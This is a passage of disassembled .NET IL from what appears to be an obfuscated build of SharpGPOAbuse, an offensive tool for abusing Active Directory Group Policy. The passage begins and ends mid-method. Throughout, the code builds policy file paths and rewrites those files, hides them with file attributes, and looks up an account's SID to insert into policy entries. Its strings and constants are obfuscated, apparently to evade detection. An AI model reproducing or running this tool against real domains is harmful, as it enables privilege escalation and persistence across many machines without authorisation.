      IL_02bf:  brtrue.s   IL_026d

      IL_02c1:  leave      IL_02d4

    }  // end .try
    finally
    {
      IL_02c6:  ldloca.s   V_11
      IL_02c8:  constrained. valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>
      IL_02ce:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_02d3:  endfinally
    }  // end handler
    IL_02d4:  ldloc.s    V_9
    IL_02d6:  call       int32 [System.Core]System.Linq.Enumerable::Max(class [mscorlib]System.Collections.Generic.IEnumerable`1<int32>)
    IL_02db:  ldc.i4.1
    IL_02dc:  call       int32 '<Module>'(int32)
    IL_02e1:  add
    IL_02e2:  stloc.s    V_14
    IL_02e4:  ldloc.s    V_6
    IL_02e6:  ldc.i4.6
    IL_02e7:  newarr     [mscorlib]System.String
    IL_02ec:  dup
    IL_02ed:  ldc.i4.0
    IL_02ee:  ldloca.s   V_14
    IL_02f0:  call       instance string [mscorlib]System.Int32::ToString()
    IL_02f5:  stelem.ref
    IL_02f6:  dup
    IL_02f7:  ldc.i4.1
    IL_02f8:  call       int32 '<Module>'(int32)
    IL_02fd:  ldsfld     string LocalDataStoreSlot
    IL_0302:  stelem.ref
    IL_0303:  dup
    IL_0304:  ldc.i4.2
    IL_0305:  ldarg.0
    IL_0306:  stelem.ref
    IL_0307:  dup
    IL_0308:  ldc.i4.3
    IL_0309:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_030e:  stelem.ref
    IL_030f:  dup
    IL_0310:  ldc.i4.4
    IL_0311:  ldloca.s   V_14
    IL_0313:  call       instance string [mscorlib]System.Int32::ToString()
    IL_0318:  stelem.ref
    IL_0319:  dup
    IL_031a:  ldc.i4.5
    IL_031b:  ldsfld     string LocalDataStoreMgr
    IL_0320:  stelem.ref
    IL_0321:  call       string [mscorlib]System.String::Concat(string[])
    IL_0326:  dup
    IL_0327:  stloc.3
    IL_0328:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
    IL_032d:  ldloc.2
    IL_032e:  newobj     instance void [mscorlib]System.IO.StreamWriter::.ctor(string)
    IL_0333:  stloc.s    V_15
    .try
    {
      IL_0335:  ldloc.s    V_6
      IL_0337:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<!0> class [mscorlib]System.Collections.Generic.List`1<string>::GetEnumerator()
      IL_033c:  stloc.s    V_11
      .try
      {
        IL_033e:  br         IL_0355

        IL_0343:  ldloca.s   V_11
        IL_0345:  call       instance !0 valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::get_Current()
        IL_034a:  stloc.s    V_16
        IL_034c:  ldloc.s    V_15
        IL_034e:  ldloc.s    V_16
        IL_0350:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
        IL_0355:  ldloca.s   V_11
        IL_0357:  call       instance bool valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::MoveNext()
        IL_035c:  brtrue.s   IL_0343

        IL_035e:  leave      IL_0380

      }  // end .try
      finally
      {
        IL_0363:  ldloca.s   V_11
        IL_0365:  constrained. valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>
        IL_036b:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0370:  endfinally
      }  // end handler
    }  // end .try
    finally
    {
      IL_0371:  ldloc.s    V_15
      IL_0373:  brfalse    IL_037f

      IL_0378:  ldloc.s    V_15
      IL_037a:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_037f:  endfinally
    }  // end handler
    IL_0380:  ldloc.2
    IL_0381:  ldloc.2
    IL_0382:  call       valuetype [mscorlib]System.IO.FileAttributes [mscorlib]System.IO.File::GetAttributes(string)
    IL_0387:  ldc.i4.2
    IL_0388:  or
    IL_0389:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                      valuetype [mscorlib]System.IO.FileAttributes)
    IL_038e:  br         IL_03af

    IL_0393:  ldloc.2
    IL_0394:  ldloc.3
    IL_0395:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                     string)
    IL_039a:  ldloc.2
    IL_039b:  call       valuetype [mscorlib]System.IO.FileAttributes [mscorlib]System.IO.File::GetAttributes(string)
    IL_03a0:  pop
    IL_03a1:  ldloc.2
    IL_03a2:  ldloc.2
    IL_03a3:  call       valuetype [mscorlib]System.IO.FileAttributes [mscorlib]System.IO.File::GetAttributes(string)
    IL_03a8:  ldc.i4.2
    IL_03a9:  or
    IL_03aa:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                      valuetype [mscorlib]System.IO.FileAttributes)
    IL_03af:  ldsfld     string Math
    IL_03b4:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_03b9:  ldloc.1
    IL_03ba:  ldc.i4     0x1c2c9675
    IL_03bf:  stloc.s    V_17
    IL_03c1:  ldloc.s    V_17
    IL_03c3:  ldc.i4     0x18bc440e
    IL_03c8:  bne.un     IL_03d3

    IL_03cd:  ldarg.0
    IL_03ce:  br         IL_03db

    IL_03d3:  nop
    IL_03d4:  ldarg.1
    IL_03d5:  br         IL_03db

    IL_03da:  nop
    IL_03db:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                     string)
    IL_03e0:  ldarg.s    IStore
    IL_03e2:  ldsfld     string Mda
    IL_03e7:  callvirt   instance bool [mscorlib]System.String::Equals(string)
    IL_03ec:  brfalse    IL_0408

    IL_03f1:  ldarg.2
    IL_03f2:  ldarg.s    IStore_BindingResult
    IL_03f4:  ldarg.s    IStore_BindingResult_BoundVersion
    IL_03f6:  ldloc.s    V_4
    IL_03f8:  ldsfld     string MethodAccessException
    IL_03fd:  ldsfld     string MidpointRounding
    IL_0402:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS(string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string)
    IL_0407:  ret

    IL_0408:  ldarg.2
    IL_0409:  ldarg.s    IStore_BindingResult
    IL_040b:  ldarg.s    IStore_BindingResult_BoundVersion
    IL_040d:  ldloc.s    V_4
    IL_040f:  ldsfld     string MissingMemberException
    IL_0414:  ldsfld     string MissingFieldException
    IL_0419:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS(string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string)
    IL_041e:  ret
  } // end of method IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::StoreOperationScavenge

  .method public hidebysig static void  StoreTransaction(string IManifestParseErrorCallback,
                                                         string IsolationInterop,
                                                         string IManifestInformation,
                                                         string IActContext,
                                                         string StateManager_RunningState,
                                                         string IStateManager,
                                                         string ArrayList,
                                                         string BitArray,
                                                         bool CaseInsensitiveComparer,
                                                         string IHashCodeProvider) cil managed
  {
    // Code size       787 (0x313)
    .maxstack  24
    .locals init ([0] string V_0,
             [1] string V_1,
             [2] valuetype [mscorlib]System.Guid V_2,
             [3] string V_3,
             [4] string V_4,
             [5] string V_5,
             [6] string V_6,
             [7] class [mscorlib]System.Collections.Generic.List`1<string> V_7,
             [8] class [mscorlib]System.IO.StreamReader V_8,
             [9] string V_9,
             [10] class [mscorlib]System.IO.StreamWriter V_10,
             [11] valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string> V_11,
             [12] string V_12)
    IL_0000:  ldsfld     string MissingMethodException
    IL_0005:  stloc.0
    IL_0006:  ldsfld     string MulticastNotSupportedException
    IL_000b:  stloc.1
    IL_000c:  ldarg.s    IHashCodeProvider
    IL_000e:  ldsfld     string NonSerializedAttribute
    IL_0013:  callvirt   instance bool [mscorlib]System.String::Equals(string)
    IL_0018:  brfalse    IL_005d

    IL_001d:  ldsfld     string NotFiniteNumberException
    IL_0022:  ldc.i4.5
    IL_0023:  newarr     [mscorlib]System.Object
    IL_0028:  dup
    IL_0029:  ldc.i4.0
    IL_002a:  ldarg.s    IStateManager
    IL_002c:  stelem.ref
    IL_002d:  dup
    IL_002e:  ldc.i4.1
    IL_002f:  ldarg.s    StateManager_RunningState
    IL_0031:  stelem.ref
    IL_0032:  dup
    IL_0033:  ldc.i4.2
    IL_0034:  ldarg.s    BitArray
    IL_0036:  stelem.ref
    IL_0037:  dup
    IL_0038:  ldc.i4.3
    IL_0039:  ldarg.s    ArrayList
    IL_003b:  stelem.ref
    IL_003c:  dup
    IL_003d:  ldc.i4.4
    IL_003e:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
    IL_0043:  stloc.2
    IL_0044:  ldloca.s   V_2
    IL_0046:  constrained. [mscorlib]System.Guid
    IL_004c:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_0051:  stelem.ref
    IL_0052:  call       string [mscorlib]System.String::Format(string,
                                                                object[])
    IL_0057:  stloc.3
    IL_0058:  br         IL_0098

    IL_005d:  ldsfld     string NotImplementedException
    IL_0062:  ldc.i4.5
    IL_0063:  newarr     [mscorlib]System.Object
    IL_0068:  dup
    IL_0069:  ldc.i4.0
    IL_006a:  ldarg.s    IStateManager
    IL_006c:  stelem.ref
    IL_006d:  dup
    IL_006e:  ldc.i4.1
    IL_006f:  ldarg.s    StateManager_RunningState
    IL_0071:  stelem.ref
    IL_0072:  dup
    IL_0073:  ldc.i4.2
    IL_0074:  ldarg.s    BitArray
    IL_0076:  stelem.ref
    IL_0077:  dup
    IL_0078:  ldc.i4.3
    IL_0079:  ldarg.s    ArrayList
    IL_007b:  stelem.ref
    IL_007c:  dup
    IL_007d:  ldc.i4.4
    IL_007e:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
    IL_0083:  stloc.2
    IL_0084:  ldloca.s   V_2
    IL_0086:  constrained. [mscorlib]System.Guid
    IL_008c:  callvirt   instance string [mscorlib]System.Object::ToString()
    IL_0091:  stelem.ref
    IL_0092:  call       string [mscorlib]System.String::Format(string,
                                                                object[])
    IL_0097:  stloc.3
    IL_0098:  ldarg.1
    IL_0099:  ldarg.2
    IL_009a:  ldarg.3
    IL_009b:  call       string SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::ISTORE_ENUM_FILES_FLAGS(string,
                                                                                                                            string,
                                                                                                                            string)
    IL_00a0:  stloc.s    V_4
    IL_00a2:  ldc.i4.6
    IL_00a3:  newarr     [mscorlib]System.String
    IL_00a8:  dup
    IL_00a9:  ldc.i4.0
    IL_00aa:  ldsfld     string NotSupportedException
    IL_00af:  stelem.ref
    IL_00b0:  dup
    IL_00b1:  ldc.i4.1
    IL_00b2:  ldarg.0
    IL_00b3:  stelem.ref
    IL_00b4:  dup
    IL_00b5:  ldc.i4.2
    IL_00b6:  ldsfld     string NullReferenceException
    IL_00bb:  stelem.ref
    IL_00bc:  dup
    IL_00bd:  ldc.i4.3
    IL_00be:  ldarg.0
    IL_00bf:  stelem.ref
    IL_00c0:  dup
    IL_00c1:  ldc.i4.4
    IL_00c2:  ldsfld     string Number
    IL_00c7:  stelem.ref
    IL_00c8:  dup
    IL_00c9:  ldc.i4.5
    IL_00ca:  ldloc.s    V_4
    IL_00cc:  stelem.ref
    IL_00cd:  call       string [mscorlib]System.String::Concat(string[])
    IL_00d2:  stloc.s    V_5
    IL_00d4:  ldloc.s    V_5
    IL_00d6:  ldsfld     string ObjectDisposedException
    IL_00db:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00e0:  stloc.s    V_6
    IL_00e2:  ldloc.s    V_5
    IL_00e4:  call       bool [mscorlib]System.IO.Directory::Exists(string)
    IL_00e9:  brfalse    IL_0112

    IL_00ee:  ldarg.s    IHashCodeProvider
    IL_00f0:  ldsfld     string ObsoleteAttribute
    IL_00f5:  callvirt   instance bool [mscorlib]System.String::Equals(string)
    IL_00fa:  brfalse    IL_0112

    IL_00ff:  ldloc.s    V_5
    IL_0101:  ldsfld     string OleAutBinder
    IL_0106:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_010b:  stloc.s    V_5
    IL_010d:  br         IL_0159

    IL_0112:  ldloc.s    V_5
    IL_0114:  call       bool [mscorlib]System.IO.Directory::Exists(string)
    IL_0119:  brfalse    IL_0142

    IL_011e:  ldarg.s    IHashCodeProvider
    IL_0120:  ldsfld     string OperatingSystem
    IL_0125:  callvirt   instance bool [mscorlib]System.String::Equals(string)
    IL_012a:  brfalse    IL_0142

    IL_012f:  ldloc.s    V_5
    IL_0131:  ldsfld     string OperationCanceledException
    IL_0136:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_013b:  stloc.s    V_5
    IL_013d:  br         IL_0159

    IL_0142:  ldsfld     string OverflowException
    IL_0147:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_014c:  ldc.i4.0
    IL_014d:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_0152:  ldlen
    IL_0153:  sub
    IL_0154:  call       void [mscorlib]System.Environment::Exit(int32)
    IL_0159:  ldloc.s    V_5
    IL_015b:  call       bool [mscorlib]System.IO.Directory::Exists(string)
    IL_0160:  brtrue     IL_016d

    IL_0165:  ldloc.s    V_5
    IL_0167:  call       class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.Directory::CreateDirectory(string)
    IL_016c:  pop
    IL_016d:  ldloc.s    V_5
    IL_016f:  ldsfld     string ParamArrayAttribute
    IL_0174:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0179:  stloc.s    V_5
    IL_017b:  ldloc.s    V_5
    IL_017d:  call       bool [mscorlib]System.IO.File::Exists(string)
    IL_0182:  brfalse    IL_02b8

    IL_0187:  ldarg.s    CaseInsensitiveComparer
    IL_0189:  brfalse    IL_02a7

    IL_018e:  ldsfld     string ParseNumbers
    IL_0193:  ldloc.s    V_5
    IL_0195:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_019a:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_019f:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
    IL_01a4:  stloc.s    V_7
    IL_01a6:  ldloc.s    V_5
    IL_01a8:  newobj     instance void [mscorlib]System.IO.StreamReader::.ctor(string)
    IL_01ad:  stloc.s    V_8
    .try
    {
      IL_01af:  br         IL_01e7

      IL_01b4:  ldloc.s    V_9
      IL_01b6:  ldsfld     string PlatformID
      IL_01bb:  ldsfld     string PlatformNotSupportedException
      IL_01c0:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01c5:  ldsfld     string Random
      IL_01ca:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_01cf:  brfalse    IL_01de

      IL_01d4:  ldloc.3
      IL_01d5:  ldloc.s    V_9
      IL_01d7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_01dc:  stloc.s    V_9
      IL_01de:  ldloc.s    V_7
      IL_01e0:  ldloc.s    V_9
      IL_01e2:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<string>::Add(!0)
      IL_01e7:  ldloc.s    V_8
      IL_01e9:  callvirt   instance string [mscorlib]System.IO.TextReader::ReadLine()
      IL_01ee:  dup
      IL_01ef:  stloc.s    V_9
      IL_01f1:  brtrue.s   IL_01b4

      IL_01f3:  leave      IL_0207

    }  // end .try
    finally
    {
      IL_01f8:  ldloc.s    V_8
      IL_01fa:  brfalse    IL_0206

      IL_01ff:  ldloc.s    V_8
      IL_0201:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_0206:  endfinally
    }  // end handler
    IL_0207:  ldloc.s    V_5
    IL_0209:  newobj     instance void [mscorlib]System.IO.StreamWriter::.ctor(string)
    IL_020e:  stloc.s    V_10
    .try
    {
      IL_0210:  ldloc.s    V_7
      IL_0212:  callvirt   instance valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<!0> class [mscorlib]System.Collections.Generic.List`1<string>::GetEnumerator()
      IL_0217:  stloc.s    V_11
      .try
      {
        IL_0219:  br         IL_0230

        IL_021e:  ldloca.s   V_11
        IL_0220:  call       instance !0 valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::get_Current()
        IL_0225:  stloc.s    V_12
        IL_0227:  ldloc.s    V_10
        IL_0229:  ldloc.s    V_12
        IL_022b:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
        IL_0230:  ldloca.s   V_11
        IL_0232:  call       instance bool valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>::MoveNext()
        IL_0237:  brtrue.s   IL_021e

        IL_0239:  leave      IL_025b

      }  // end .try
      finally
      {
        IL_023e:  ldloca.s   V_11
        IL_0240:  constrained. valuetype [mscorlib]System.Collections.Generic.List`1/Enumerator<string>
        IL_0246:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_024b:  endfinally
      }  // end handler
    }  // end .try
    finally
    {
      IL_024c:  ldloc.s    V_10
      IL_024e:  brfalse    IL_025a

      IL_0253:  ldloc.s    V_10
      IL_0255:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_025a:  endfinally
    }  // end handler
    IL_025b:  ldarg.s    IHashCodeProvider
    IL_025d:  ldsfld     string RankException
    IL_0262:  callvirt   instance bool [mscorlib]System.String::Equals(string)
    IL_0267:  brfalse    IL_0285

    IL_026c:  ldarg.0
    IL_026d:  ldarg.3
    IL_026e:  ldarg.2
    IL_026f:  ldloc.s    V_6
    IL_0271:  ldsfld     string ResId
    IL_0276:  ldsfld     string CtorDelegate
    IL_027b:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS(string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string)
    IL_0280:  br         IL_0299

    IL_0285:  ldarg.0
    IL_0286:  ldarg.3
    IL_0287:  ldarg.2
    IL_0288:  ldloc.s    V_6
    IL_028a:  ldsfld     string ICustomAttributeProvider
    IL_028f:  ldsfld     string _MemberInfo
    IL_0294:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS(string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string)
    IL_0299:  ldc.i4.0
    IL_029a:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_029f:  ldlen
    IL_02a0:  sub
    IL_02a1:  call       void [mscorlib]System.Environment::Exit(int32)
    IL_02a6:  ret

    IL_02a7:  ldsfld     string MemberInfo
    IL_02ac:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_02b1:  ldc.i4.0
    IL_02b2:  call       void [mscorlib]System.Environment::Exit(int32)
    IL_02b7:  ret

    IL_02b8:  ldsfld     string _Type
    IL_02bd:  ldloc.s    V_5
    IL_02bf:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_02c4:  call       void [mscorlib]System.Console::WriteLine(string)
    IL_02c9:  ldloc.s    V_5
    IL_02cb:  ldloc.0
    IL_02cc:  ldloc.3
    IL_02cd:  ldloc.1
    IL_02ce:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_02d3:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                     string)
    IL_02d8:  ldarg.s    IHashCodeProvider
    IL_02da:  ldsfld     string IReflect
    IL_02df:  callvirt   instance bool [mscorlib]System.String::Equals(string)
    IL_02e4:  brfalse    IL_02fe

    IL_02e9:  ldarg.0
    IL_02ea:  ldarg.3
    IL_02eb:  ldarg.2
    IL_02ec:  ldloc.s    V_6
    IL_02ee:  ldsfld     string Type
    IL_02f3:  ldsfld     string RuntimeType
    IL_02f8:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS(string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string)
    IL_02fd:  ret

    IL_02fe:  ldarg.0
    IL_02ff:  ldarg.3
    IL_0300:  ldarg.2
    IL_0301:  ldloc.s    V_6
    IL_0303:  ldsfld     string ReflectionOnlyType
    IL_0308:  ldsfld     string CerArrayList`1
    IL_030d:  call       void SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::IIDENTITYAUTHORITY_DOES_DEFINITION_MATCH_REFERENCE_FLAGS(string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string,
                                                                                                                                                           string)
    IL_0312:  ret
  } // end of method IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::StoreTransaction

  .method public hidebysig static void  CaseInsensitiveHashCodeProvider(string CollectionBase,
                                                                        string Comparer,
                                                                        string IDictionary,
                                                                        string DictionaryBase,
                                                                        string[] DictionaryEntry,
                                                                        string EmptyReadOnlyDictionaryInternal) cil managed
  {
    // Code size       808 (0x328)
    .maxstack  18
    .locals init ([0] class [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.PrincipalContext V_0,
             [1] class [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.UserPrincipal V_1,
             [2] string V_2,
             [3] string V_3,
             [4] string V_4,
             [5] string[] V_5,
             [6] int32 V_6,
             [7] string V_7,
             [8] string V_8,
             [9] string V_9,
             [10] bool V_10,
             [11] string[] V_11,
             [12] class [mscorlib]System.IO.StreamWriter V_12,
             [13] string V_13)
    IL_0000:  ldc.i4.1
    IL_0001:  call       int32 '<Module>'(int32)
    IL_0006:  ldarg.1
    IL_0007:  newobj     instance void [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.PrincipalContext::.ctor(valuetype [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.ContextType,
                                                                                                                                                      string)
    IL_000c:  stloc.0
    IL_000d:  ldnull
    IL_000e:  stloc.1
    .try
    {
      IL_000f:  ldloc.0
      IL_0010:  ldc.i4.0
      IL_0011:  ldarg.s    EmptyReadOnlyDictionaryInternal
      IL_0013:  call       class [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.UserPrincipal [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.UserPrincipal::FindByIdentity(class [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.PrincipalContext,
                                                                                                                                                                                                                                                           valuetype [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.IdentityType,
                                                                                                                                                                                                                                                           string)
      IL_0018:  stloc.1
      IL_0019:  ldsfld     string CerHashtable`2
      IL_001e:  ldarg.s    EmptyReadOnlyDictionaryInternal
      IL_0020:  ldsfld     string Utf8String
      IL_0025:  ldloc.1
      IL_0026:  callvirt   instance class [mscorlib]System.Security.Principal.SecurityIdentifier [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.Principal::get_Sid()
      IL_002b:  callvirt   instance string [mscorlib]System.Security.Principal.IdentityReference::get_Value()
      IL_0030:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0035:  call       void [mscorlib]System.Console::WriteLine(string)
      IL_003a:  leave      IL_0083

    }  // end .try
    catch [mscorlib]System.Object 
    {
      IL_003f:  pop
      IL_0040:  ldc.i4.5
      IL_0041:  newarr     [mscorlib]System.String
      IL_0046:  dup
      IL_0047:  ldc.i4.0
      IL_0048:  ldsfld     string ASSERT
      IL_004d:  stelem.ref
      IL_004e:  dup
      IL_004f:  ldc.i4.1
      IL_0050:  ldarg.s    EmptyReadOnlyDictionaryInternal
      IL_0052:  stelem.ref
      IL_0053:  dup
      IL_0054:  ldc.i4.2
      IL_0055:  ldsfld     string LOGIC
      IL_005a:  stelem.ref
      IL_005b:  dup
      IL_005c:  ldc.i4.3
      IL_005d:  ldarg.0
      IL_005e:  stelem.ref
      IL_005f:  dup
      IL_0060:  ldc.i4.4
      IL_0061:  ldsfld     string RuntimeArgumentHandle
      IL_0066:  stelem.ref
      IL_0067:  call       string [mscorlib]System.String::Concat(string[])
      IL_006c:  call       void [mscorlib]System.Console::WriteLine(string)
      IL_0071:  ldc.i4.0
      IL_0072:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
      IL_0077:  ldlen
      IL_0078:  sub
      IL_0079:  call       void [mscorlib]System.Environment::Exit(int32)
      IL_007e:  leave      IL_0083

    }  // end handler
    IL_0083:  ldarg.1
    IL_0084:  ldarg.2
    IL_0085:  ldarg.3
    IL_0086:  call       string SharpGPOAbuse.IIDENTITYAUTHORITY_DEFINITION_IDENTITY_TO_TEXT_FLAGS::ISTORE_ENUM_FILES_FLAGS(string,
                                                                                                                            string,
                                                                                                                            string)
    IL_008b:  stloc.2
    IL_008c:  ldsfld     string RuntimeTypeHandle
    IL_0091:  stloc.3
    IL_0092:  ldnull
    IL_0093:  stloc.s    V_4
    IL_0095:  ldarg.s    DictionaryEntry
    IL_0097:  stloc.s    V_5
    IL_0099:  ldc.i4.0
    IL_009a:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_009f:  ldlen
    IL_00a0:  add
    IL_00a1:  stloc.s    V_6
    IL_00a3:  br         IL_00a8

    IL_00a8:  ldloc.s    V_5
    IL_00aa:  ldloc.s    V_6
    IL_00ac:  ldelem     [mscorlib]System.String
    IL_00b1:  stloc.s    V_7
    IL_00b3:  ldc.i4.5
    IL_00b4:  newarr     [mscorlib]System.String
    IL_00b9:  dup
    IL_00ba:  ldc.i4.0
    IL_00bb:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_00c0:  ldlen
    IL_00c1:  add
    IL_00c2:  ldloc.3
    IL_00c3:  stelem.ref
    IL_00c4:  dup
    IL_00c5:  ldc.i4.1
    IL_00c6:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_00cb:  stelem.ref
    IL_00cc:  dup
    IL_00cd:  ldc.i4.2
    IL_00ce:  ldloc.s    V_7
    IL_00d0:  stelem.ref
    IL_00d1:  dup
    IL_00d2:  ldc.i4.3
    IL_00d3:  ldsfld     string RuntimeMethodHandle
    IL_00d8:  stelem.ref
    IL_00d9:  dup
    IL_00da:  ldc.i4.4
    IL_00db:  ldloc.1
    IL_00dc:  callvirt   instance class [mscorlib]System.Security.Principal.SecurityIdentifier [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.Principal::get_Sid()
    IL_00e1:  callvirt   instance string [mscorlib]System.Security.Principal.IdentityReference::get_Value()
    IL_00e6:  stelem.ref
    IL_00e7:  call       string [mscorlib]System.String::Concat(string[])
    IL_00ec:  stloc.3
    IL_00ed:  ldc.i4.5
    IL_00ee:  newarr     [mscorlib]System.String
    IL_00f3:  dup
    IL_00f4:  ldc.i4.0
    IL_00f5:  ldloc.s    V_4
    IL_00f7:  stelem.ref
    IL_00f8:  dup
    IL_00f9:  ldc.i4.1
    IL_00fa:  ldloc.s    V_7
    IL_00fc:  stelem.ref
    IL_00fd:  dup
    IL_00fe:  ldc.i4.2
    IL_00ff:  ldsfld     string RuntimeFieldHandle
    IL_0104:  stelem.ref
    IL_0105:  dup
    IL_0106:  ldc.i4.3
    IL_0107:  ldloc.1
    IL_0108:  callvirt   instance class [mscorlib]System.Security.Principal.SecurityIdentifier [System.DirectoryServices.AccountManagement]System.DirectoryServices.AccountManagement.Principal::get_Sid()
    IL_010d:  callvirt   instance string [mscorlib]System.Security.Principal.IdentityReference::get_Value()
    IL_0112:  stelem.ref
    IL_0113:  dup
    IL_0114:  ldc.i4.4
    IL_0115:  call       string [mscorlib]System.Environment::get_NewLine()
    IL_011a:  stelem.ref
    IL_011b:  call       string [mscorlib]System.String::Concat(string[])
    IL_0120:  stloc.s    V_4
    IL_0122:  ldloc.s    V_6
    IL_0124:  ldc.i4.1
    IL_0125:  call       int32 '<Module>'(int32)
    IL_012a:  add
    IL_012b:  stloc.s    V_6
    IL_012d:  ldloc.s    V_6
    IL_012f:  ldloc.s    V_5
    IL_0131:  ldlen
    IL_0132:  conv.i4
    IL_0133:  blt        IL_0138

    IL_0138:  ldc.i4.6
    IL_0139:  newarr     [mscorlib]System.String
    IL_013e:  dup
    IL_013f:  ldc.i4.0
    IL_0140:  ldsfld     class [mscorlib]System.Type[] [mscorlib]System.Type::EmptyTypes
    IL_0145:  ldlen
    IL_0146:  add
    IL_0147:  ldsfld     string AssemblyHandle
    IL_014c:  stelem.ref
    IL_014d:  dup
    IL_014e:  ldc.i4.1
    IL_014f:  ldarg.0
    IL_0150:  stelem.ref
    IL_0151:  dup
    IL_0152:  ldc.i4.2
    IL_0153:  ldsfld     string ModuleHandle
    IL_0158:  stelem.ref
    IL_0159:  dup
    IL_015a:  ldc.i4.3
    IL_015b:  ldarg.0
    IL_015c:  stelem.ref
    IL_015d:  dup
    IL_015e:  ldc.i4.4
    IL_015f:  ldsfld     string Signature
    IL_0164:  stelem.ref
    IL_0165:  dup
    IL_0166:  ldc.i4.5
    IL_0167:  ldloc.2
    IL_0168:  stelem.ref
    IL_0169:  call       string [mscorlib]System.String::Concat(string[])
